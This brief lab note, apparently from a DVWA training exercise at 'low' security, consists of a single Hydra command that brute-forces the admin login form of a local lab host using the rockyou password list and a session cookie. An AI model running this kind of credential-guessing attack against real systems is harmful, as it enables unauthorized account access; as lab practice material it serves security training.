# LOW
hydra -l admin -P /usr/share/wordlists/rockyou.txt -s 80 192.168.56.103 http-get-form "/dvwa/vulnerabilities/brute/index.php:username=^USER^&password=^PASS^&Login=Login:H=Cookie:security=low; PHPSESSID=h2dk437g0mu5nvf0l6bgtqvkk6:Username and/or password incorrect"
